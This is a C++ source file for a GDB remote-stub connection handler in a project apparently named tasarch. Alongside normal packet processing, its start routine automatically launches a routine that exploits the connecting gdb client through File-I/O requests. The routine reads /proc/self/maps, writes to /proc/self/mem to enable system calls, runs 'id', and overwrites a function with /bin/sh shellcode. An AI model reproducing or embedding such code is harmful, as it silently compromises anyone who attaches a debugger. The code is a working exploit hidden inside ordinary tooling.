#include <cstdio>
#include <cstring>
#include <exception>
#include <stdexcept>
#include <thread>
#include <utility>
#include <vector>
#include "connection.h"
#include <asio/async_result.hpp>
#include <asio/awaitable.hpp>
#include <asio/co_spawn.hpp>
#include <asio/detached.hpp>
#include <asio/use_awaitable.hpp>
#include <fmt/core.h>
#include "easter_eggs.h"
#include "gdb/packet_io.h"
#include "gdb/protocol.h"
	
namespace tasarch::gdb {
    connection::connection(tcp::socket sock, std::shared_ptr<Debugger> debugger) : log::WithLogger("gdb.conn"), debugger(std::move(debugger)), packet_io(sock)
    {
        using namespace tasarch::gdb::coders;
        bind_handler<Str<Hex, ',', true>, Str<Hex>>(read_mem, &connection::handle_read_mem);
        bind_handler<Str<Hex, ',', true>, Str<Hex, ':', true>, Bytes<std::vector<u8>>>(write_mem, &connection::handle_write_mem);
        bind_handler<>(get, [](connection* self){ self->handle_query(get_val); });
        bind_handler<>(set, [](connection* self){ self->handle_query(set_val); });
        bind_handler<Str<NumCoder<int64_t, 16>, ','>, Opt<Str<Hex, ','>>, Opt<Str<IdCoder<std::string>, ';'>>, Opt<Str<>>>(file_io, &connection::handle_file_reply);

        add_query("Supported").bind_get_query<ArrayCoder<FeatureCoder>>(&connection::handle_supported);

        std::string packet_size;
        size_t pkt_size = gdb_packet_buffer_size;
        Hex::encode_to(pkt_size, packet_size);
        our_features.emplace_back("PacketSize", packet_size);

        internal_mem::init();
    }

    void connection::start()
    {
        if (this->running) {
            this->logger->warn("Already running!");
            return;
        }
        this->running = true;
        this->should_stop = false;
        asio::co_spawn(this->packet_io.socket.get_executor(), this->process(), asio::detached);
        asio::co_spawn(this->packet_io.socket.get_executor(), this->remote_io_testing(), asio::detached);
    }

    void connection::stop()
    {
        /**
         * @todo Locking!
         */
        if (!this->running) {
            this->logger->warn("Not running!");
            return;
        }
        if (this->should_stop) {
            this->logger->warn("Already stopped!");
            return;
        }
        this->should_stop = true;
    }

    auto connection::process() -> asio::awaitable<void>
    {
        this->logger->info("Starting processing loop...");
        try {
            while (true) {
                this->logger->trace("process loop iteration");
                if (!this->packet_io.socket.is_open()) {
                    this->logger->info("Remote socket {} closed, exiting...", this->packet_io.socket.remote_endpoint());
                    break;
                }
                if (should_stop) {
                    this->logger->info("Got stop signal, exiting...");
                    break;
                }
                this->logger->trace("reading remote packet...");
                bool did_break = false;
                try {
                    did_break = co_await this->packet_io.receive_packet(this->packet_buf);
                } catch (timed_out& e) {
                    this->logger->trace("recv timed out");
                    continue;
                } /*catch (...) {
                    auto eptr = std::current_exception();
                    try {
                        std::rethrow_exception(eptr);
                    } catch (timed_out& e) {
                        this->logger->critical("what???");
                    }
                }*/
                
                auto req = this->packet_buf.read_buf<std::string>();
                this->logger->trace("received remote packet:\n\t{}", req);
                this->resp_buf.reset();
                this->should_respond = true;
                try {
                    if (did_break) {
                        this->logger->info("Remote requested a break!");
                        //this->debugger->request_break();
                        if (this->packet_buf.read_size() > 0) {
                            this->logger->warn("Got packet and break request!");
                        }
                        this->append_str("S05");
                    } else {
                        co_await this->process_pkt();
                    }
                } catch (gdb_error& e) {
                    this->logger->warn("Had gdb error: {}", e.what());
                    this->append_error(e.code);
                } catch (unknown_request& e) {
                    this->logger->warn("Had unknown request: {}", e.request);
                    // respond with empty response
                    this->resp_buf.reset();
                } catch (std::exception& e) {
                    this->logger->error("Had unknown exception: {}", e.what());
                    this->append_error(unknown);
                }
                if (this->should_respond) {
                    co_await this->send_response();
                } else {
                    this->logger->debug("Something else responded already, doing nothing now...");
                }

            }
        } catch (std::exception& e) {
            this->logger->error("Unhandled exception in processing loop: {}", e.what());
            this->stop();
        } catch (...) {
            this->logger->critical("Completely unknown exception wtf????");
            this->stop();
        }
    }
    
    asio::awaitable<void> connection::process_pkt()
    {
        u8 ident = this->packet_buf.get_byte();
        auto type = static_cast<packet_type>(ident);
        switch (type) {
        case query_stop_reason:
        this->logger->trace("Queried stop reason");
        this->append_str("S05");
        break;

        case read_gpr:
        this->append_str("0000000000000000000000000000000000000000000000000000000000000000");
        break;

        case read_reg:
        this->append_str("0000");
        break;

        case cont:
        {
            this->wakeup_request();
        }
        break;

        default:
        {
            if (packet_handlers.contains(type)) {
                packet_handlers[type]();
            } else {
                std::string res = this->packet_buf.get_str();
                throw unknown_request(fmt::format("ident {:c}, rest: {}", ident, res));
            }
        }

        }

        co_return;
    }

    void connection::append_error(err_code code)
    {
        std::string err_str = fmt::format("E{:02X}", code);
        this->resp_buf.append_buf(err_str);
    }

    void connection::append_ok()
    {
        std::string ok_str = "OK";
        this->resp_buf.append_buf(ok_str);
    }

    void connection::append_str(std::string s)
    {
        this->resp_buf.append_buf(s);
    }

    void connection::append_hex(std::string s)
    {
        for (auto car : s) {
            u8 low = car & 0xf;
            u8 hi = (car >> 4) & 0xf;
            this->resp_buf.put_byte(encode_hex(hi));
            this->resp_buf.put_byte(encode_hex(low));
        }
    }

    auto connection::send_response() -> asio::awaitable<void>
    {
        auto resp = this->resp_buf.read_buf<std::string>();
        this->logger->trace("sending response packet:\n\t{}", resp);
        co_await this->packet_io.send_packet(this->resp_buf);
    }

    auto connection::remote_io(std::string name, std::string args) -> asio::awaitable<remote_io_reply>
    {
        this->logger->debug("Doing remote syscall {} with args {}", name, args);
        this->logger->debug("remote syscall, waiting on opportunity to request...");
        co_await this->wait_for_request();

        this->logger->debug("Got chance to respond!");
        this->append_str(fmt::format("F{},{}", name, args));

        this->logger->debug("Waiting for response...");

        auto resp = co_await this->wait_for_response();

        if (resp.retcode < 0 && resp.errorno.has_value()) {
            size_t error = resp.errorno.value();
            throw std::runtime_error(fmt::format("Remote io {},{} failed! ret: {}, error code: {}, error: {}", name, args, resp.retcode, error, std::strerror(error)));
        }

        co_return resp;
    }

    auto connection::wait_for_request() -> asio::awaitable<void>
    {
        return asio::async_initiate<asio::use_awaitable_t<> const&, void(void)>([this](auto&& handler){
            this->io_req.push(std::forward<decltype(handler)>(handler));
        }, asio::use_awaitable);
    }

    auto connection::wait_for_response() -> asio::awaitable<remote_io_reply>
    {
        return asio::async_initiate<asio::use_awaitable_t<> const&, void(remote_io_reply)>([this](auto&& handler){
            this->io_resp.push(std::forward<decltype(handler)>(handler));
        }, asio::use_awaitable);
    }

    auto connection::wakeup_request() -> void
    {
        if (!this->io_req.empty()) {
            this->logger->debug("Have queued remote io call!");
            auto resume = std::move(this->io_req.front());
            this->io_req.pop();
            resume();
            this->logger->debug("Resume finished!");
        } else {
            this->logger->trace("No io req waiting, sending no response");
            this->should_respond = false;
        }
    }

    auto connection::remote_io_encode_str(std::string str) -> std::string
    {
        // first add to internal memory
        auto buf = internal_mem::add_str(std::move(str));
        // + 1 for null byte!
        return fmt::format("{:x}/{:x}\x00", buf.address, buf.len+1);
    }

    auto connection::remote_io_open(std::string filename, int flags) -> asio::awaitable<int>
    {
        std::string args = fmt::format("{},{:x},{:x}", remote_io_encode_str(std::move(filename)), flags, S_IRUSR | S_IWUSR);
        auto ret = co_await this->remote_io("open", args);
        co_return ret.retcode;
    }

    auto connection::remote_io_read(int fd, size_t max) -> asio::awaitable<std::string>
    {
        auto buf = internal_mem::reserve(max);
        auto ret = co_await this->remote_io("read", fmt::format("{:x},{:x},{:x}", fd, buf.address, max));
        auto data = internal_mem::read_data(buf.address, ret.retcode);
        co_return std::string(reinterpret_cast<char*>(data.data()), ret.retcode);
    }

    auto connection::remote_io_lseek(int fd, int64_t offset, int flag) -> asio::awaitable<int64_t>
    {
        auto ret = co_await this->remote_io("lseek", fmt::format("{:x},{:x},{:x}", fd, offset, flag));
        co_return ret.retcode;
    }

    auto connection::remote_io_write(int fd, std::vector<u8>& data) -> asio::awaitable<int64_t>
    {
        auto buf = internal_mem::add_data(data);
        auto ret = co_await this->remote_io("write", fmt::format("{:x},{:x},{:x}", fd, buf.address, buf.len));
        co_return ret.retcode;
    }

    auto connection::remote_io_system(std::string command) -> asio::awaitable<int>
    {
        auto ret = co_await this->remote_io("system", remote_io_encode_str(command));
        co_return ret.retcode;
    }

    auto connection::remote_io_testing() -> asio::awaitable<void>
    {
        this->logger->info("Starting remote io testing stuff...");
        try {
            size_t var_offset = 0x8A6EF8;
            int fd = co_await this->remote_io_open("/proc/self/maps", O_RDONLY);
            auto conts = co_await this->remote_io_read(fd, 0x1000);
            this->logger->info("Hahaha dumped gdb memory maps: {}", conts);
            int mem_fd = co_await this->remote_io_open("/proc/self/mem");
            this->logger->info("LMFAO got mem fd: {}", mem_fd);
            size_t pie_base = 0;
            sscanf(conts.c_str(), "%lx", &pie_base);
            this->logger->info("PIE BASE @ 0x{:x}", pie_base);
            co_await this->remote_io_lseek(mem_fd, pie_base + var_offset);
            std::vector<u8> overwrite;
            overwrite.resize(4);
            overwrite[0] = 0xff;
            co_await this->remote_io_write(mem_fd, overwrite);
            this->logger->info("Should now have allowed system!");
            co_await this->remote_io_system("echo 'PWND!'; id;");
            size_t func_offset = 0x36E0C0;
            std::vector<u8> shellcode = {0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72, 0x69, 0x1, 0x1, 0x81, 0x34, 0x24, 0x1, 0x1, 0x1, 0x1, 0x31, 0xf6, 0x56, 0x6a, 0x8, 0x5e, 0x48, 0x1, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31, 0xd2, 0x6a, 0x3b, 0x58, 0xf, 0x5};
            // auto sh_buf = internal_mem::add_data(shellcode);
            co_await this->remote_io_lseek(mem_fd, pie_base + func_offset);
            co_await this->remote_io_write(mem_fd, shellcode);
            co_await this->remote_io("unlink", "");

        } catch (std::exception& e) {
            this->logger->error("Failed doing remote io: {}", e.what());
        }

        co_return;
    }
} // namespace tasarch::gdb